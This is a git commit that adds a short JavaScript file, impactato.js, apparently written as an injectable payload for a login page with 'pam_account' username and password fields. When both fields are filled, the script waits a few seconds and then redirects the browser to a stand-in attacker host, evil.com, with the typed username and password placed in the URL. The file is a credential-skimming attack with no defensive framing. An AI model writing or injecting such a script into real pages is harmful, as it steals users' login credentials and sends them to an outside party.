e20e89aa8a1e53fee3f126c170bd8bbddfb06967
haxuanhuy <52565807+haxuanhuy@users.noreply.github.com>
2025-06-18 10:18:59 +0700

    Create impactato.js

---
+++ impactato.js
@@ -0,0 +1,23 @@
+let isFilled = false;
+
+ function checkInputs() {
+    const input1 = document.getElementsByName('pam_account[login_name]')[0];
+    const input2 = document.getElementsByName('pam_account[login_password]')[0];
+
+    if (input1.value && input2.value) {
+      if (!isFilled) {
+        isFilled = true; 
+        setTimeout(function() {
+          location.replace("//evil.com?param1=" + document.getElementsByName('pam_account[login_name]')[0].value + "&param2=" + document.getElementsByName('pam_account[login_password]')[0].value);
+         
+        }, 4500); 
+      }
+    }
+  }
+
+  
+  window.onload = checkInputs;
+
+
+  document.getElementsByName('pam_account[login_name]')[0].addEventListener('input', checkInputs);
+  document.getElementsByName('pam_account[login_password]')[0].addEventListener('input', checkInputs);
